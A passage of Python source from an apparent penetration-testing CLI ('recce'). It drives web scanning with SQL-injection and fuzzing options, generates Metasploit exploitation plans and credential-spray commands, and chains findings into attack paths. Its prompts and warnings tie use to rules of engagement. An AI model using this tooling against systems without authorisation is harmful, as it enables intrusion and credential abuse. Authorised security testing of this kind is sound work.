        _phase_db(store, paths, args, profile)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Database scan done.")
    return 0


def cmd_privesc(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        if args.scan:
            # _phase_privesc already set privesc_checked in the worker and cleared the
            # override via clear_step - no second full pass over every host needed.
            _phase_privesc(store, paths, args, profile)
        else:
            print("[*] Generating priv-esc playbook from existing data "
                  "(use --scan to also run remote privesc NSE checks).")
            # No worker ran, so mark the step + clear the override for selected hosts here.
            for h in _selected_hosts(store.all_hosts(), args):
                if not h.privesc_checked:
                    h.privesc_checked = True
                    store.upsert_host(h)
                store.delete_tracking(tr.step_key("privesc", h.ip))
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Priv-esc sheet updated.")
    return 0


def cmd_credenum(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    _, paths, store = _setup_scan(args, need_targets=False)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        _phase_credenum(store, paths, args)
        # Note: the manual 'Creds' checklist box is the operator's own sign-off,
        # so credenum records findings but never ticks it automatically.
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Credentialed enum complete - see Users & Accounts / Vulnerabilities.")
    return 0


def cmd_writeups(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)   # honour any Excel edits first
    hosts = _selected_hosts(store.all_hosts(), args)
    out_dir = os.path.join(args.output_dir, "writeups")
    from .report_docx import build_writeups
    from . import screenshot

    shots: dict = {}
    if not args.no_screenshots and not screenshot.available():
        print("[!] No headless browser found; skipping auto-screenshots (add them "
              "by hand in Word). Install firefox or chromium to enable them.")
    elif not args.no_screenshots:
        web_hosts = [h for h in hosts
                     if any(screenshot._web_url(p) for p in h.open_ports)]
        if web_hosts:
            print(f"[*] Capturing web screenshots for {len(web_hosts)} host(s) "
                  f"(headless browser) ...")
            for h in web_hosts:
                grabbed = screenshot.capture_for_host(h)
                if grabbed:
                    shots[h.ip] = grabbed
                    print(f"    [+] {h.ip}: {len(grabbed)} screenshot(s)")
    summary = build_writeups(hosts, out_dir, min_severity=args.min_severity,
                             include_potential=args.include_potential,
                             screenshots=shots, overwrite=args.overwrite)
    title = store.get_meta("engagement") or args.title
    combined_path = None
    if not args.no_combined:
        from .report_docx import build_combined
        combined_path = os.path.join(out_dir, "findings_report.docx")
        build_combined(hosts, combined_path, title=f"{title} - Findings Report",
                       min_severity=args.min_severity,
                       include_potential=args.include_potential, screenshots=shots)
    store.close()
    scope = "all" if args.include_potential else "real"
    print(f"\n[+] Finding write-ups: {len(summary['written'])} generated, "
          f"{len(summary['skipped'])} kept (already edited), "
          f"{summary['total']} {scope} finding(s) total.")
    print(f"    -> {out_dir}/  (open each .docx in Word to finish it)")
    if combined_path:
        print(f"[+] Combined report (summary table + all findings): {combined_path}")
    if summary.get("dropped_potential"):
        print(f"    ({summary['dropped_potential']} low-confidence 'potential' "
              f"finding(s) skipped; add --include-potential to write them up too)")
    if summary["skipped"]:
        print("    (use --overwrite to regenerate the kept ones - loses edits)")
    return 0


def cmd_writeup(args: argparse.Namespace) -> int:
    """Write up a SINGLE finding, pre-filled with looted/obtained evidence. With
    no selector, list the findings so the tester can pick one."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = store.all_hosts()
    from .report_docx import list_findings, build_one_writeup

    if not args.selector:
        findings = list_findings(hosts, min_severity="info")
        if not findings:
            print("[!] No findings yet. Run `vulns` (or `import`/`ingest`) first.")
            store.close()
            return 0
        print(f"Findings ({len(findings)}) - pick one:  recce writeup <id|CVE|IP|word> "
              f"-o {args.output_dir}\n")
        for row in findings:
            tag = "" if row["real"] else "  (potential)"
            aff = ", ".join(row["affected"][:4]) + ("..." if len(row["affected"]) > 4 else "")
            cve = f"  {row['cves'][0]}" if row["cves"] else ""
            print(f"  {row['id']}  {row['severity'].upper():<8} {row['title']}{cve}")
            print(f"          affected: {aff}{tag}")
        store.close()
        return 0

    out_dir = os.path.join(args.output_dir, "writeups")
    shots: dict = {}
    if not args.no_screenshots:
        from . import screenshot
        if screenshot.available():
            res = _match_one_host(hosts, args.selector)
            for h in res:
                grabbed = screenshot.capture_for_host(h)
                if grabbed:
                    shots[h.ip] = grabbed
    result = build_one_writeup(hosts, out_dir, args.selector,
                               screenshots=shots, overwrite=args.overwrite)
    store.close()
    if result["written"]:
        m = result["matched"][0]
        print(f"[+] Wrote {m['id']} ({m['severity'].upper()}): {m['title']}")
        print(f"    -> {result['written']}")
        if result.get("looted"):
            print(f"    pre-filled with {result['looted']} looted/obtained item(s) "
                  f"for the affected host(s).")
        if not result.get("real", True):
            print("    note: this is a low-confidence 'potential' (version-inferred) finding.")
        print("    Open it in Word to finish the narrative, impact, and screenshots.")
        return 0
    # No single match: help the tester narrow it.
    if result["reason"] == "exists":
        print(f"[!] Write-up already exists: {result['path']}")
        print("    Use --overwrite to regenerate it (loses any edits).")
        return 0
    cand = result["matched"]
    if not cand:
        print(f"[x] No finding matches '{args.selector}'. "
              f"Run `recce writeup -o {args.output_dir}` to list them.")
        return 1
    print(f"[!] '{args.selector}' matches {len(cand)} findings - be more specific:")
    for m in cand:
        print(f"    {m['id']}  {m['severity'].upper():<8} {m['title']}  "
              f"[{', '.join(m['affected'][:3])}]")
    return 1


def _match_one_host(hosts, selector):
    """Best-effort: the host(s) an IP/IP:port selector points at (for screenshots)."""
    sel = (selector or "").split(":")[0].strip()
    return [h for h in hosts if h.ip == sel] if sel else []


def cmd_web(args: argparse.Namespace) -> int:
    """Deep-enumerate every web-facing endpoint: fingerprint the stack and run the
    non-intrusive checks (exposed .git/.env, server-status/actuator, directory
    listing, dangerous methods, cookie flags, headers/TLS). Findings fold into the
    workbook; each endpoint gets the exact Kali deep-scan commands."""
    from . import web
    print(BANNER)
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    active = not getattr(args, "no_active", False)
    # Optional authenticated scan: --cookie and/or repeated --header "K: V".
    auth: dict = {}
    if getattr(args, "cookie", None):
        auth["Cookie"] = args.cookie
    for hv in getattr(args, "header", None) or []:
        if ":" in hv:
            k, v = hv.split(":", 1)
            auth[k.strip()] = v.strip()
    auth = auth or None
    targets = [h for h in hosts if any(web.is_web(p) for p in h.open_ports)]
    if not targets:
        print("[!] No HTTP/HTTPS endpoints found. Run `enum` (services) first.")
        store.close()
        return 0
    workers = max(1, getattr(args, "workers", 6))
    n_ep = sum(1 for h in targets for p in h.open_ports if web.is_web(p))
    print(f"[*] Web-scanning {n_ep} endpoint(s) on {len(targets)} host(s) "
          f"with {workers} worker(s){'' if active else ' (passive)'}"
          f"{' (authenticated)' if auth else ''} ...")
    total_findings = 0
    creds = getattr(args, "creds", False)
    do_crawl = getattr(args, "crawl", False)
    sqli_time = getattr(args, "sqli_time", False)
    fuzz_risky = getattr(args, "fuzz_risky_forms", False)

    def _scan(h):
        profiles = web.scan_host(h, active, auth, creds)
        if do_crawl:
            pages, added = web.scan_crawl(h, auth, time_based=sqli_time,
                                          fuzz_risky=fuzz_risky)
            print(f"    [{h.ip}] crawled {pages} page(s), +{added} finding(s)")
        return profiles

    budget = getattr(args, "budget", None)
    started = time.monotonic()
    stopped_budget = False
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_scan, h): h for h in targets}
        for fut in as_completed(futures):
            # Wall-clock budget: stop scheduling more hosts (in-flight ones finish and
            # are persisted per host below, so partial coverage is kept).
            if budget is not None and not stopped_budget \
                    and time.monotonic() - started > budget:
                stopped_budget = True
                for pending in futures:
                    pending.cancel()
            h = futures[fut]
            try:
                profiles = fut.result()
            except CancelledError:
                continue
            except Exception as e:  # noqa: BLE001 - one host never aborts the sweep
                _record_issues(store, paths, h.ip, [{"phase": "web", "level": "warning",
                               "message": f"web scan failed: {e}"}])
                continue
            # clear_step so a re-run clears a stale manual "web" tick, matching
            # enum/vuln/db/privesc (previously the web override never self-healed).
            _persist_host(store, paths, h.ip, "web", h, clear_step="web")
            for pr in profiles:
                tech = f"  [{', '.join(pr['tech'])}]" if pr["tech"] else ""
                wv = sum(1 for v in h.vulns if v.port == pr["port"] and v.source == "web")
                total_findings += wv
                print(f"    {pr['url']:<28} {pr.get('server', '') or '?':<20}"
                      f"{tech}  ({wv} finding(s))")
    if stopped_budget:
        print("    [!] Time budget (--budget) reached - stopped scheduling more hosts; "
              "results scanned so far were saved.")
    _final_report(store, paths, store.get_meta("engagement") or args.title)
    store.close()
    if getattr(args, "screenshots", False):
        _web_screenshots(targets, args.output_dir)
    print(f"\n[+] {total_findings} web finding(s) folded in. See the Web tab (endpoints "
          f"+ Kali deep-scan commands) and Vulnerabilities/Verification in "
          f"{paths['xlsx']}.")
    print("    Prove them: recce prove -o " + args.output_dir)
    return 0


def _web_screenshots(targets, output_dir) -> None:
    """Headless-browser screenshot per web endpoint -> engagement/screenshots/."""
    from . import screenshot, web
    if not screenshot.available():
        print("    [!] --screenshots: no headless browser found (chromium/firefox); "
              "skipping. `recce doctor` shows what's missing.")
        return
    shot_dir = os.path.join(output_dir, "screenshots")
    try:
        os.makedirs(shot_dir, exist_ok=True)
    except OSError:
        return
    n = 0
    for h in targets:
        for p in h.open_ports:
            if not web.is_web(p):
                continue
            png = screenshot.capture(web.url_for(h.ip, p))
            if png:
                fn = os.path.join(shot_dir, f"web_{h.ip}_{p.portid}.png")
                try:
                    with open(fn, "wb") as fh:
                        fh.write(png)
                    n += 1
                except OSError:
                    pass
    print(f"    {n} screenshot(s) -> {shot_dir}/")


def cmd_services(args: argparse.Namespace) -> int:
    """Print the exact per-service enumeration command to run for every open port
    recce found - the bridge from the datastore to recce/scripts/. Answers 'what
    do I type next?' for each service."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    hosts = _selected_hosts(store.all_hosts(), args)
    store.close()
    from . import serviceenum

    print("Per-service enumeration - run these against the open ports recce found.")
    print("Safe by default (banners, versions, anon/null checks, TLS, NSE 'safe');")
    print("add -a to a command for the intrusive checks (brute / nikto / dir-bust).\n")
    total = 0
    unmapped: list[tuple[str, int, str]] = []
    for h in hosts:
        cmds = serviceenum.commands_for_host(h)
        um = serviceenum.unmapped_ports(h)
        if not cmds and not um:
            continue
        label = h.ip + (f"  ({h.hostname})" if h.hostname else "")
        roles = f"   [{', '.join(h.roles)}]" if h.roles else ""
        print(f"{label}{roles}")
        for port, svc, _script, cmd in cmds:
            print(f"  {port:<6}{svc:<14}{cmd}" + ("  -a" if args.aggressive else ""))
            total += 1
        for port, svc in um:
            unmapped.append((h.ip, port, svc))
        print()
    if total == 0:
        print("No enumerable open ports yet. Run `enum` (or `import`) first.")
        return 0
    print(f"{total} service command(s) across {len({h.ip for h in hosts})} host(s).")
    raw_glob = os.path.join(args.output_dir, "raw", "*.xml")
    print("Or sweep every open port in one go from recce's own scans:")
    print(f"  {serviceenum.DRIVER} from-nmap {raw_glob}"
          + ("  -a" if args.aggressive else ""))
    if unmapped:
        print(f"\n{len(unmapped)} open port(s) have no dedicated script - "
              f"enumerate manually:")
        for ip, port, svc in unmapped[:15]:
            print(f"  {ip}:{port} ({svc or '?'})  ->  nmap -sV --script vuln -p {port} {ip}")
        if len(unmapped) > 15:
            print(f"  ... and {len(unmapped) - 15} more")
    return 0


def cmd_exploitplan(args: argparse.Namespace) -> int:
    """Generate a per-finding exploitation PLAN: ready-to-run artifacts that drive
    EXISTING published tools/modules with the discovered parameters filled in.
    Confirmed findings only; safe by default (msf launch lines commented)."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    store.close()
    from . import exploitplan

    summary = exploitplan.build_plan(hosts, args.output_dir, lhost=args.lhost,
                                     lport=args.lport, run=args.run)
    if not summary["plans"]:
        print("[!] No confirmed findings map to a published exploit/tool yet.")
        print("    Plans cover CONFIRMED findings only (not 'potential' version "
              "guesses). Run `vulns` for deeper detection, or `ingest` on-target loot.")
        return 0
    print(f"[+] Exploitation plan -> {summary['dir']}/")
    print(f"    {summary['host_scripts']} per-host plan script(s), "
          f"{summary['rc_files']} Metasploit resource (.rc) file(s), "
          f"{summary.get('poc_files', 0)} PoC source file(s), "
          f"{summary['actions']} action(s) across {len(summary['plans'])} host(s).")
    print("    Each artifact configures an EXISTING published tool/module with the")
    print("    target's own parameters. PoC sources build a proof (marker file /")
    print("    throwaway account) - swap the ACTION for your ROE command.")
    if args.lhost == "<LHOST>":
        print("    ! Set your callback with --lhost <IP> (payloads currently show "
              "<LHOST>).")
    if args.run:
        print("    ! --run: Metasploit launch lines are ARMED. Rules of engagement only.")
    else:
        print("    Safe mode: .rc files run `check` only; edit them (or use --run) "
              "to launch.")
    print(f"    Review:  cat {summary['dir']}/README.txt")
    return 0


def _prove_run_safe_checks(store, paths, hosts, args) -> None:
    """--run: re-run the NON-INTRUSIVE detection NSE for SMB findings so a verdict
    can move from LIKELY to CONFIRMED / FALSE POSITIVE on real evidence. These are
    detection scripts (smb-security-mode, smb-vuln-ms17-010), not exploits."""
    from . import proofs
    profile = scanner.PROFILES.get(getattr(args, "profile", "standard"),
                                   scanner.PROFILES["standard"])
    smb_scripts = ["smb-security-mode", "smb2-security-mode",
                   "smb-vuln-ms17-010", "smb-enum-shares"]
    smb_recipes = {"smb-signing-relay", "ms17-010", "smb-null-session"}
    for h in hosts:
        rids = {proofs.recipe_for(v)["id"] for v in h.vulns if proofs.recipe_for(v)}
        if not (rids & smb_recipes) or not any(p.portid in (139, 445) for p in h.open_ports):
            continue
        print(f"[*] {h.ip}: re-running safe SMB detection NSE to prove/disprove ...")
        out = os.path.join(paths["raw"], f"{h.ip}_prove.xml")
        try:
            _, iss = scanner.nse_scan(h.ip, [445], out, profile, smb_scripts)
            if iss:
                _record_issues(store, paths, h.ip, [_mkissue(iss, "prove")])
            _merge_vuln_results(h, np.parse_nmap_xml(out))
            ad.parse_signing_and_ntlm(h)          # refresh smb_signing from the NSE
            _persist_host(store, paths, h.ip, "prove", h)
        except Exception as e:  # noqa: BLE001 - one host's re-scan never aborts prove
            print(f"    [!] {h.ip}: prove re-scan failed: {e}")


def cmd_prove(args: argparse.Namespace) -> int:
    """Prove out flagged findings: for the noisy types (ActiveMQ / SMB / MS17-010 /
    SeImpersonate / …) render a verdict - CONFIRMED, LIKELY, FALSE POSITIVE or
    INCONCLUSIVE - from the evidence recce already holds, plus the exact safe step
    to finish proving. Nothing here exploits anything."""
    from . import proofs
    print(BANNER)
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    if getattr(args, "run", False):
        _prove_run_safe_checks(store, paths, hosts, args)
        hosts = _selected_hosts(store.all_hosts(), args)      # reload merged results
    results = proofs.verify_hosts(hosts)
    if not results:
        print("[!] No proof-able findings matched (ActiveMQ / SMB signing / MS17-010 / "
              "SeImpersonate / null-session / anon-FTP / weak-TLS).")
        store.close()
        return 0
    icon = {proofs.CONFIRMED: "[+]", proofs.LIKELY: "[~]",
            proofs.INCONCLUSIVE: "[?]", proofs.FALSE_POSITIVE: "[x]"}
    for r in results:
        print(f"\n  {icon.get(r['verdict'], '[?]')} {r['verdict']}  "
              f"{r['ip']}:{r['port'] or '-'}  {r['vuln']}")
        for e in r["evidence"]:
            print(f"        - {e}")
        if r["verdict"] in (proofs.CONFIRMED, proofs.LIKELY):
            print(f"        finish: {r['finish']}")
    c = proofs.summary(results)
    print(f"\n[+] {c[proofs.CONFIRMED]} confirmed · {c[proofs.LIKELY]} likely · "
          f"{c[proofs.INCONCLUSIVE]} inconclusive · {c[proofs.FALSE_POSITIVE]} false positive.")
    _final_report(store, paths, store.get_meta("engagement") or args.title)
    store.close()
    print(f"    Full detail on the Verification tab in {paths['xlsx']}.")
    return 0


def cmd_attackpath(args: argparse.Namespace) -> int:
    """Chain the confirmed findings into a prioritised attack path (foothold ->
    priv-esc -> creds -> lateral -> domain), grounded in what recce found."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`vulns`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    store.close()
    from . import attackpath as ap

    steps = ap.build(hosts)
    for line in ap.narrative(hosts, steps):
        print(line)
    if not steps:
        return 0
    print()
    cur = None
    for s in steps:
        if s["stage"] != cur:
            cur = s["stage"]
            print(f"== {cur} ==")
        tgt = s["ip"] + (f" ({s['hostname']})" if s["hostname"] else "")
        print(f"  [{tgt}] {s['title']}")
        print(f"       {s['tool']}:  {s['cmd']}")
    # Graph artifacts - Mermaid (paste anywhere) + Graphviz DOT (render to PNG).
    svg_path = os.path.join(args.output_dir, "attack-path.svg")
    try:
        os.makedirs(args.output_dir, exist_ok=True)
        svg = ap.svg(hosts, steps).replace(
            "<svg ", '<svg xmlns="http://www.w3.org/2000/svg" ', 1)
        with open(svg_path, "w", encoding="utf-8") as fh:
            fh.write(svg)
        print(f"\n  Diagram: {svg_path}  (open in any browser — no tools, prints to PDF)")
    except OSError as exc:
        print(f"  [!] Could not write the diagram: {exc}")
    print("\n  Full table on the Attack Path sheet; runnable artifacts via "
          "`recce exploitplan`.")
    return 0


def _parse_cred_spec(spec: str):
    """Parse 'user:secret', 'DOMAIN\\user:secret', or 'domain/user:secret'."""
    from .models import Credential
    idpart, secret = (spec.split(":", 1) + [""])[:2] if ":" in spec else (spec, "")
    domain = ""
    if "\\" in idpart:
        domain, user = idpart.split("\\", 1)
    elif "/" in idpart:
        domain, user = idpart.split("/", 1)
    else:
        user = idpart
    kind = "nthash" if re.fullmatch(r"[0-9a-fA-F]{32}", secret or "") else \
        ("password" if secret else "blank")
    return Credential(username=user, secret=secret, kind=kind, domain=domain,
                      source="manual")


def cmd_creds(args: argparse.Namespace) -> int:
    """Stack credentials (auto-harvested + manually captured) and build a spray
    plan across the discovered SMB/WinRM/LDAP/MSSQL/RDP/SSH surface."""
    from . import credentials as cr
    from .models import Credential
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1

    # ADD captured credentials.
    added = False
    to_add = []
    for spec in (args.add or []):
        to_add.append(_parse_cred_spec(spec))
    if args.user:
        kind = "nthash" if args.hash else ("password" if getattr(args, "password", None) else "blank")
        to_add.append(Credential(username=args.user, secret=(args.hash or args.password or ""),
                                 kind=kind, domain=args.domain or "", source="manual"))
    if to_add:
        n = sum(1 for c in to_add if store.add_credential(c))
        print(f"[+] Added {n} credential(s)"
              + (f" ({len(to_add) - n} already stacked)" if n < len(to_add) else "") + ".")
        added = True

    hosts = _selected_hosts(store.all_hosts(), args)
    stored = store.all_credentials()
    stacked = cr.stack(hosts, stored)

    # PLAN: write files + print the spray commands.
    if args.plan:
        if not stacked:
            print("[!] No credentials to spray yet. Add one:  "
                  "recce creds --add 'CORP\\alice:Passw0rd!'")
            store.close()
            return 0
        summary = cr.build_spray(stacked, hosts, args.output_dir)
        print(f"[+] Spray plan for {len(stacked)} credential(s) -> files in "
              f"{summary['dir']}/")
        if summary["files"]:
            print("    " + ", ".join(sorted(summary["files"])))
        print()
        for line in summary["commands"] or ["  (no sprayable services in scope yet)"]:
            print("  " + line if not line.startswith("#") else "\n  " + line)
        print("\n  ! Check the account-lockout policy first. '--continue-on-success' "
              "keeps going after a hit;")
        print("    the paired (user<->pass) list avoids a cartesian brute. Rules of "
              "engagement only.")
        store.close()
        return 0

    # ADD then regenerate the workbook so the Credentials sheet reflects it.
    if added:
        title = store.get_meta("engagement") or getattr(args, "title", "") or "Recce Engagement"
        _generate_reports(store, paths, title, quiet=True)

    # LIST (default).
    if not stacked:
        print("No credentials stacked yet.")
        print("  Capture then add:  recce creds --add 'CORP\\alice:Passw0rd!'  "
              "(or --user alice --hash <nt> --domain CORP)")
        print("  Then:              recce creds --plan   # netexec/impacket spray plan")
        store.close()
        return 0
    print(f"Stacked credentials ({len(stacked)}):")
    for c in stacked:
        sec = c.secret or "(blank)"
        if c.kind == "nthash" and len(sec) > 16:
            sec = sec[:13] + "..."
        origin = f" @{c.origin_ip}" if c.origin_ip else ""
        print(f"  {c.label:<26} {c.kind:<8} {sec:<20} [{c.source}{origin}]")
    print("\n  recce creds --plan   # build the spray plan (writes users/passwords/"
          "hashes + commands)")
    store.close()
    return 0


def cmd_doctor(args: argparse.Namespace) -> int:
    """Check that this box can run the tool, and optionally prove it with a
    real localhost self-scan. Run this on any system before an engagement."""
    import platform
    import shutil

    print(BANNER)
    print("Environment")
    print(f"  Python           {sys.version.split()[0]}  ({platform.python_implementation()})")
    print(f"  Platform         {platform.system()} {platform.release()}")
    is_root = hasattr(os, "geteuid") and os.geteuid() == 0
    print(f"  Root / privileges {'yes' if is_root else 'NO'}"
          + ("" if is_root else "  -> falls back to TCP connect scan; no SYN/OS/UDP"))
    py_ok = sys.version_info >= (3, 9)
    if not py_ok:
        print("  ! Python 3.9+ recommended.")

    print("\nTools (which capabilities are available)")
    tools = [
        ("nmap", True, "core scanning / service+OS detection / NSE vuln+AD+DB"),
        ("masscan", False, "--fast network-wide sweep"),
        ("searchsploit", False, "offline exploit mapping (Exploits sheet)"),
        ("ldap", False, "credentialed AD LDAP enum (ldapsearch or the ldap3 package)"),
        ("netexec", False, "credentialed SMB/AD enum (credenum phase)"),
        ("ssh", False, "credentialed Linux local checks (credenum phase)"),
        ("browser", False, "auto web screenshots in write-ups (firefox/chromium)"),
    ]
    nmap_ok = False
    presence: dict[str, bool] = {}   # reused for the summary, so it can't disagree
    for name, required, desc in tools:
        present = shutil.which(name) is not None
        if name == "searchsploit":
            from . import exploits
            present = exploits.available()               # mirror the runtime gate
        if name == "ldap":
            from . import ad
            present = ad.ldap_available()                # ldapsearch OR ldap3 package
            if present:
                backend = "ldapsearch" if shutil.which("ldapsearch") else "ldap3 package"
                desc = f"credentialed AD LDAP enum (using {backend})"
        if name == "netexec":
            from . import credenum
            present = credenum.smb_tool() is not None   # nxc / crackmapexec too
        if name == "browser":
            from . import screenshot
            present = screenshot.available()             # firefox / chrome variants
            found = screenshot.browser_tool()
            if found:
                desc = f"auto web screenshots in write-ups (using {found})"
        if name == "nmap":
            nmap_ok = present
        presence[name] = present
        mark = "OK  " if present else ("MISSING (required)" if required else "-   (optional)")
        print(f"  {name:<15} {mark:<20} {desc}")
    from . import credenum as _ce
    if _ce.impacket_tool("GetUserSPNs"):
        print(f"  {'impacket':<15} {'OK  ':<20} Kerberoast / AS-REP / secretsdump")
    import importlib.util
    if importlib.util.find_spec("openpyxl") is not None:
        print("  openpyxl        OK   (not required; stdlib xlsx is built in)")

    # Optional real self-scan to prove the pipeline end-to-end on THIS box.
    scan_ok = None
    if nmap_ok and not args.no_self_scan:
        print("\nSelf-scan (real nmap against 127.0.0.1, top 100 ports) ...")
        scan_ok = _self_scan()
        print("  " + ("PASS - scanned, parsed, and wrote a workbook."
                      if scan_ok else "FAIL - see error above."))

    print("\nSummary")
    if not nmap_ok:
        print("  NOT READY - install nmap (the only hard requirement).")
        verdict = 1
    elif scan_ok is False:
        print("  NOT READY - nmap is present but the self-scan failed (see above).")
        verdict = 1
    else:
        degraded = [n for n, req, _ in tools if not req and not presence.get(n)]
        print("  READY." + (f"  Optional tools missing: {', '.join(degraded)}."
                            if degraded else "  All tools present."))
        # Tell the user HOW to get each missing optional tool, not just its name.
        _install = {
            "masscan": "apt install masscan",
            "searchsploit": "apt install exploitdb",
            "netexec": "pipx install netexec  (+ pipx install impacket)",
            "ssh": "apt install openssh-client",
        }
        for n in degraded:
            if n in _install:
                print(f"      - {n}: {_install[n]}")
        verdict = 0
    return verdict


def _self_scan() -> bool:
    import tempfile
    try:
        from . import scanner
        profile = scanner.PROFILES["quick"]
        with tempfile.TemporaryDirectory() as d:
            fp = os.path.join(d, "p.xml")
            scanner.full_port_scan("127.0.0.1", fp, profile)
            ports = _ports_for_host(fp, "127.0.0.1")
            deep = os.path.join(d, "e.xml")
            scanner.enum_scan("127.0.0.1", ports or [80], deep, profile)  # (xml, issue)
            host = _fold_host("127.0.0.1", np.parse_nmap_xml(deep), {"127.0.0.1": "local"})
            host.enumerated = True
            from .report_excel import build_workbook, read_workbook_tracking
            out = os.path.join(d, "wb.xlsx")
            build_workbook([host], out)
            read_workbook_tracking(out)  # prove read-back parses too
            print(f"  found {len(host.open_ports)} open port(s) on 127.0.0.1; "
                  f"report + read-back OK.")
        return True
    except Exception as e:  # noqa: BLE001
        print(f"  error: {e}")
        return False


def _run_ldap_enum(store: Store, args: argparse.Namespace) -> None:
    if not ad.ldap_available():
        print("[!] --ldap-enum requested but no LDAP client found; skipping. "
              "Install ldap-utils (ldapsearch) for airgapped use, or ldap3.")
        return
    all_hosts = store.all_hosts()
    dc_ips = [args.dc_ip] if args.dc_ip else [h.ip for h in ad.domain_controllers(all_hosts)]
    if not dc_ips:
        print("[!] No Domain Controllers found for LDAP enumeration "
              "(use --dc-ip to target one directly).")
        return
    for dc_ip in dc_ips:
        anon = args.ldap_anon and not args.username
        label = "anonymous" if anon else f"as {args.domain}\\{args.username}"
        print(f"[*] LDAP enumeration of {dc_ip} ({label}) ...")
        try:
            domain, accounts = ad.ldap_enumerate(
                dc_ip, domain=args.domain or "", username=args.username or "",
                password=args.password or "", use_ssl=args.ldap_ssl, anonymous=anon)
        except Exception as e:  # noqa: BLE001
            print(f"[!] LDAP enumeration failed for {dc_ip}: {e}")
            continue
        host = store.get_host(dc_ip)
        if host is not None:
            existing = {(a.source, a.kind, a.name) for a in host.accounts}
            host.accounts.extend(a for a in accounts
                                 if (a.source, a.kind, a.name) not in existing)
            store.upsert_host(host)
        store.upsert_domain(domain)
        n_users = sum(1 for a in accounts if a.kind == "user")
        n_spn = sum(1 for a in accounts if a.attrs.get("spn"))
        n_asrep = sum(1 for a in accounts if a.attrs.get("asrep_roastable") == "yes")
        print(f"    +{len(accounts)} objects ({n_users} users, {n_spn} with SPN, "
              f"{n_asrep} AS-REP roastable) for domain {domain.name or '?'}.")


def _ip_key(ip: str):
    try:
        return tuple(int(o) for o in ip.split("."))
    except ValueError:
        return (999, ip)


def _fold_host(ip, parsed_list, subnet_map):
    base = Host(ip=ip, subnet=subnet_map.get(ip, ""))
    for h in parsed_list:
        if h.ip != ip:
            continue
        base.hostnames = list(dict.fromkeys(base.hostnames + h.hostnames))
        base.mac = base.mac or h.mac
        base.vendor = base.vendor or h.vendor
        if h.os_accuracy >= base.os_accuracy and h.os_name:
            base.os_name, base.os_accuracy, base.os_family = h.os_name, h.os_accuracy, h.os_family
        base.distance = base.distance or h.distance
        # Carry proof-of-life: an imported .gnmap/.nmap host with no open ports and no
        # hostname is kept up only by its up_reason ("report-listed"); dropping it here
        # would make is_up wrongly read False and hide the host the report enumerated.
        base.up_reason = base.up_reason or h.up_reason
        base.state = h.state or base.state
        base.last_scanned = h.last_scanned or base.last_scanned
        base.ports.extend(h.ports)
        base.vulns.extend(h.vulns)
        base.accounts.extend(h.accounts)
        base.exploits.extend(h.exploits)
        base.host_scripts.extend(h.host_scripts)
    base.subnet = subnet_map.get(ip, base.subnet)
    return base


# --- report / status / review ---------------------------------------------------

def _resolve_ingest_host(store, parsed, args, topo=None):
    """Pick (or create) the Host that on-target loot belongs to.

    Priority: an explicit --host, else an IP parsed from the loot that already
    exists, else a synthetic host keyed by the loot's hostname/filename so the
    findings still land somewhere on the Priv-Esc sheet."""
    hosts = {h.ip: h for h in store.all_hosts()}
    hn = parsed.get("hostname", "")
    if getattr(args, "host", None):
        ip = args.host
        host = hosts.get(ip) or Host(ip=ip)
        # Record the loot's hostname so a later no --host ingest of the same box
        # matches this entry instead of synthesizing a second local:<host> one.
        if hn and hn not in host.hostnames:
            host.hostnames.append(hn)
        _tag_host_os(host, parsed)
        return host, (ip in hosts)
    # No --host: resolve from the host's OWN interface IPs in the ingested NETWORK
